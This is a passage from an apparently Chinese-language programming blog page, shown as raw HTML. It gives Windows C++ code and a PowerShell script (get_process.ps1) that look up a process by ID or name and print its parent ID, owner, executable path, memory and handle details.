keyword">void</span> <span class="token function">printProc</span><span class="token punctuation">(</span>PROCESSENTRY32 pe32<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[Process Info]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"name: %s\n"</span><span class="token punctuation">,</span> <span class="token function">toChar</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pid: %u\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ppid: %u\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>th32ParentProcessID<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"owner: %s\n"</span><span class="token punctuation">,</span> <span class="token function">getProcessOwner</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"dwSize: %u\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>dwSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"cntThreads: %u\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>cntThreads<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"pcPriClassBase: %ld\n"</span><span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>pcPriClassBase<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 拍摄当前进程模块列表快照</span>    HANDLE hModule <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPMODULE<span class="token punctuation">,</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hModule <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// printf("[Error] Fail to take process snapshot\n");</span>        <span class="token comment" spellcheck="true">// printSysError();</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"path: \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        MODULEENTRY32 me<span class="token punctuation">;</span>        me<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>MODULEENTRY32<span class="token punctuation">)</span><span class="token punctuation">;</span>        BOOL hasNext <span class="token operator">=</span> <span class="token function">Module32First</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> <span class="token operator">&amp;</span>me<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 进程模块列表迭代器</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>hasNext<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 第一个模块即进程自身, 可从中提取其可执行文件的完整路径</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"path: %s\n"</span><span class="token punctuation">,</span> <span class="token function">toChar</span><span class="token punctuation">(</span>me<span class="token punctuation">.</span>szExePath<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">CloseHandle</span><span class="token punctuation">(</span>hModule<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"==================\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 获取进程归属用户</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">getProcessOwner</span><span class="token punctuation">(</span>DWORD pid<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token operator">*</span> owner <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token number">513</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token operator">*</span>owner <span class="token operator">=</span> <span class="token string">'\0'</span><span class="token punctuation">;</span>    HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_QUERY_INFORMATION<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> owner<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    HANDLE hToken <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    DWORD dwSize <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    TCHAR szUserName<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    TCHAR szDomain<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    DWORD dwDomainSize <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>    DWORD dwNameSize <span class="token operator">=</span> <span class="token number">256</span><span class="token punctuation">;</span>    SID_NAME_USE SNU<span class="token punctuation">;</span>    PTOKEN_USER pTokenUser <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    __try <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">OpenProcessToken</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> TOKEN_QUERY<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hToken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetTokenInformation</span><span class="token punctuation">(</span>hToken<span class="token punctuation">,</span> TokenUser<span class="token punctuation">,</span> pTokenUser<span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> ERROR_INSUFFICIENT_BUFFER<span class="token punctuation">)</span> <span class="token punctuation">{</span>                __leave<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        pTokenUser <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        pTokenUser <span class="token operator">=</span> <span class="token punctuation">(</span>PTOKEN_USER<span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span>dwSize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pTokenUser <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetTokenInformation</span><span class="token punctuation">(</span>hToken<span class="token punctuation">,</span> TokenUser<span class="token punctuation">,</span> pTokenUser<span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            __leave<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">LookupAccountSid</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> pTokenUser<span class="token operator">-></span>User<span class="token punctuation">.</span>Sid<span class="token punctuation">,</span> szUserName<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwNameSize<span class="token punctuation">,</span> szDomain<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwDomainSize<span class="token punctuation">,</span> <span class="token operator">&amp;</span>SNU<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">sprintf</span><span class="token punctuation">(</span>owner<span class="token punctuation">,</span> <span class="token string">"%s\\%s\0"</span><span class="token punctuation">,</span> <span class="token function">toChar</span><span class="token punctuation">(</span>szDomain<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">toChar</span><span class="token punctuation">(</span>szUserName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> __finally <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>pTokenUser <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">free</span><span class="token punctuation">(</span>pTokenUser<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> owner<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 比较两个字符串是否相同（忽略大小写）</span>bool <span class="token function">equal</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    bool flag <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> true<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> b <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">stricmp</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 宽字符 -> ASCII字符</span><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">toChar</span><span class="token punctuation">(</span><span class="token keyword">const</span> wchar_t<span class="token operator">*</span> _wchar<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">WideCharToMultiByte</span><span class="token punctuation">(</span>CP_ACP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _wchar<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> _char <span class="token operator">=</span> new <span class="token keyword">char</span><span class="token punctuation">[</span>len<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">WideCharToMultiByte</span><span class="token punctuation">(</span>CP_ACP<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> _wchar<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> _char<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> _char<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 判断 str 是否以 substr 开头（忽略大小写）</span>bool <span class="token function">startwith</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> substr<span class="token punctuation">)</span> <span class="token punctuation">{</span>    bool flag <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> substr <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>substr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            flag <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">strnicmp</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> substr<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PowserShell-源码"><a href="#PowserShell-源码" class="headerlink" title="PowserShell 源码"></a>PowserShell 源码</h2><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># get_process.ps1 </span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># 进程信息查询脚本</span><span class="token comment" spellcheck="true"># Powershell Script 3.0+</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># 脚本使用方式:</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   通过进程号查询:</span><span class="token comment" spellcheck="true">#     .\get_process.ps1 -id 0</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#   通过进程名查询:</span><span class="token comment" spellcheck="true">#     .\get_process.ps1 -name "powershell"</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># ---------------------------------------------------------------------------------------</span><span class="token comment" spellcheck="true"># id: 进程ID（二选一）</span><span class="token comment" spellcheck="true"># name: 进程名称（二选一）</span><span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$id</span>=<span class="token operator">-</span>1<span class="token punctuation">,</span> <span class="token namespace">[string]</span><span class="token variable">$name</span>=<span class="token string">""</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 获取进程对象</span><span class="token keyword">function</span> Get<span class="token operator">-</span>Proc <span class="token punctuation">{</span>    <span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$id</span>=<span class="token operator">-</span>1<span class="token punctuation">,</span> <span class="token namespace">[string]</span><span class="token variable">$name</span>=<span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">Try</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">-gt</span> <span class="token operator">-</span>1<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$process</span> = <span class="token function">Get-Process</span> <span class="token operator">-</span>Id <span class="token variable">$id</span> <span class="token operator">-</span>ErrorAction Stop        <span class="token punctuation">}</span> <span class="token keyword">else</span>  <span class="token punctuation">{</span>            <span class="token variable">$process</span> = <span class="token function">Get-Process</span> <span class="token operator">-</span>Name <span class="token variable">$name</span> <span class="token operator">-</span>ErrorAction Stop        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token namespace">[Microsoft.PowerShell.Commands.ProcessCommandException]</span> <span class="token punctuation">{</span>        <span class="token function">Write-Warning</span> <span class="token string">"Process [id=<span class="token variable">$id</span>][name=<span class="token variable">$name</span>] has not exist"</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>        <span class="token function">Write-Warning</span> <span class="token string">"Find Process[id=<span class="token variable">$id</span>][name=<span class="token variable">$name</span>] Error"</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$process</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># 获取进程属主</span><span class="token keyword">function</span> Get<span class="token operator">-</span>Proc<span class="token operator">-</span>Owner <span class="token punctuation">{</span>    <span class="token keyword">param</span><span class="token punctuation">(</span><span class="token namespace">[int]</span><span class="token variable">$id</span>=<span class="token operator">-</span>1<span class="token punctuation">)</span>    <span class="token variable">$owner</span> = <span class="token string">""</span>    <span class="token keyword">Try</span> <span class="token punctuation">{</span>        <span class="token variable">$info</span> = <span class="token punctuation">(</span><span class="token function">Get-WmiObject</span> <span class="token operator">-</span><span class="token keyword">Class</span> Win32_Process <span class="token operator">-</span><span class="token keyword">Filter</span> <span class="token string">"Handle=<span class="token variable">$id</span>"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>GetOwner<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">.</span>ReturnValue <span class="token operator">-eq</span> 2<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$owner</span> = <span class="token string">'Unknow/Unknow'</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$owner</span> = <span class="token string">'{0}/{1}'</span> <span class="token operator">-</span>f <span class="token variable">$info</span><span class="token punctuation">.</span>Domain<span class="token punctuation">,</span> <span class="token variable">$info</span><span class="token punctuation">.</span>User        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">{</span>        <span class="token function">Write-Warning</span> <span class="token string">"Find Process[id=<span class="token variable">$id</span>]'s owner Error"</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$owner</span><span class="token punctuation">}</span><span class="token variable">$process</span> = Get<span class="token operator">-</span>Proc <span class="token operator">-</span>id <span class="token variable">$id</span> <span class="token operator">-</span>name <span class="token variable">$name</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$owner</span> = Get<span class="token operator">-</span>Proc<span class="token operator">-</span>Owner <span class="token operator">-</span>id <span class="token variable">$id</span>    <span class="token variable">$process_inst</span> = Get<span class="token operator">-</span>CimInstance Win32_Process <span class="token operator">-</span><span class="token keyword">Filter</span> <span class="token string">"ProcessId = '<span class="token variable">$id</span>'"</span>    <span class="token variable">$fid</span> = <span class="token variable">$process_inst</span><span class="token punctuation">.</span>ParentProcessId    <span class="token function">Write-Host</span> <span class="token string">"---------------------------------------"</span>    <span class="token function">Write-Host</span> <span class="token string">"PID ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Id    <span class="token function">Write-Host</span> <span class="token string">"PPID ="</span> <span class="token variable">$fid</span>    <span class="token function">Write-Host</span> <span class="token string">"Name(ProcessName) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Name    <span class="token function">Write-Host</span> <span class="token string">"Path ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Path    <span class="token function">Write-Host</span> <span class="token string">"Owner ="</span> <span class="token variable">$owner</span>    <span class="token function">Write-Host</span> <span class="token string">"Handle ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Handle    <span class="token function">Write-Host</span> <span class="token string">"Handles(Handlecount) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Handles    <span class="token function">Write-Host</span> <span class="token string">"NPM(NonpagedSystemMemorySize) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>NPM    <span class="token function">Write-Host</span> <span class="token string">"PM(PagedMemorySize) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PM    <span class="token function">Write-Host</span> <span class="token string">"VM(VirtualMemorySize) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>VM    <span class="token function">Write-Host</span> <span class="token string">"WS(WorkingSet) ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>WS    <span class="token function">Write-Host</span> <span class="token string">"BasePriority ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>BasePriority    <span class="token function">Write-Host</span> <span class="token string">"Container ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Container    <span class="token function">Write-Host</span> <span class="token string">"EnableRaisingEvents ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>EnableRaisingEvents    <span class="token function">Write-Host</span> <span class="token string">"ExitCode ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>ExitCode    <span class="token function">Write-Host</span> <span class="token string">"ExitTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>ExitTime    <span class="token function">Write-Host</span> <span class="token string">"HasExited ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>HasExited    <span class="token function">Write-Host</span> <span class="token string">"MachineName ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MachineName    <span class="token function">Write-Host</span> <span class="token string">"MainModule ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MainModule    <span class="token function">Write-Host</span> <span class="token string">"MainWindowHandle ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MainWindowHandle    <span class="token function">Write-Host</span> <span class="token string">"MainWindowTitle ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MainWindowTitle    <span class="token function">Write-Host</span> <span class="token string">"MaxWorkingSet ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MaxWorkingSet    <span class="token function">Write-Host</span> <span class="token string">"MinWorkingSet ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>MinWorkingSet    <span class="token comment" spellcheck="true"># Write-Host "Modules =" $process.Modules</span>    <span class="token function">Write-Host</span> <span class="token string">"NonpagedSystemMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>NonpagedSystemMemorySize    <span class="token function">Write-Host</span> <span class="token string">"NonpagedSystemMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>NonpagedSystemMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"NonPagedMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>NonPagedMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PagedMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PagedMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PagedSystemMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PagedSystemMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PagedSystemMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PagedSystemMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PeakPagedMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakPagedMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PeakPagedMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakPagedMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PeakVirtualMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakVirtualMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PeakVirtualMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakVirtualMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PeakWorkingSet ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakWorkingSet    <span class="token function">Write-Host</span> <span class="token string">"PeakWorkingSet64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PeakWorkingSet64    <span class="token function">Write-Host</span> <span class="token string">"PriorityBoostEnabled ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PriorityBoostEnabled    <span class="token function">Write-Host</span> <span class="token string">"PriorityClass ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PriorityClass    <span class="token function">Write-Host</span> <span class="token string">"PrivateMemorySize ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PrivateMemorySize    <span class="token function">Write-Host</span> <span class="token string">"PrivateMemorySize64 ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PrivateMemorySize64    <span class="token function">Write-Host</span> <span class="token string">"PrivilegedProcessorTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>PrivilegedProcessorTime    <span class="token function">Write-Host</span> <span class="token string">"ProcessorAffinity ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>ProcessorAffinity    <span class="token function">Write-Host</span> <span class="token string">"Responding ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Responding    <span class="token function">Write-Host</span> <span class="token string">"SessionId ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>SessionId    <span class="token function">Write-Host</span> <span class="token string">"Site ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Site    <span class="token function">Write-Host</span> <span class="token string">"StandardError ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StandardError    <span class="token function">Write-Host</span> <span class="token string">"StandardInput ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StandardInput    <span class="token function">Write-Host</span> <span class="token string">"StandardOutput ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StandardOutput    <span class="token function">Write-Host</span> <span class="token string">"StartInfo ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StartInfo    <span class="token function">Write-Host</span> <span class="token string">"StartTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>StartTime    <span class="token function">Write-Host</span> <span class="token string">"SynchronizingObject ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>SynchronizingObject    <span class="token comment" spellcheck="true"># Write-Host "Threads =" $process.Threads</span>    <span class="token function">Write-Host</span> <span class="token string">"Threads.Count ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>Threads<span class="token punctuation">.</span>Count    <span class="token function">Write-Host</span> <span class="token string">"TotalProcessorTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>TotalProcessorTime    <span class="token function">Write-Host</span> <span class="token string">"UserProcessorTime ="</span> <span class="token variable">$process</span><span class="token punctuation">.</span>UserProcessorTime    <span class="token function">Write-Host</span> <span class="token string">"VirtualMemorySize64 